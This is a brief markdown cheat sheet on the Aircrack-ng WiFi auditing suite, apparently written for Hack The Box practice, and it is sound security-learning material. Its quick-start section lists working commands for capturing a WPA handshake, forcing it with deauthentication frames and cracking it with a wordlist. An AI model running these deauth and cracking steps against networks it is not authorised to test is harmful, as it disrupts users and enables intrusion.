# Aircrack-ng Suite

## Purpose
Complete suite for WiFi security auditing: monitoring, attacking, testing, and cracking WEP/WPA/WPA2.

## Installation
```bash
sudo apt install aircrack-ng
```

## Key Tools
| Tool | Purpose |
|------|---------|
| `airmon-ng` | Enable/disable monitor mode |
| `airodump-ng` | Capture packets |
| `aireplay-ng` | Inject packets / deauth |
| `aircrack-ng` | Crack WEP/WPA keys |
| `airbase-ng` | Rogue access point |

## Quick Start
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Target specific network (capture handshake)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## WSL Limitations
Wireless hardware access is limited in WSL. For real WiFi testing:
- Use a USB WiFi adapter with monitor mode support
- Pass USB through to WSL2 (requires usbipd-win)
- Or use a live Parrot/Kali USB boot instead

## HTB Usage
- Crack provided .cap files (offline cracking works in WSL)
- `aircrack-ng -w rockyou.txt capture.cap` for WPA handshakes
- WiFi challenges usually provide capture files to crack offline
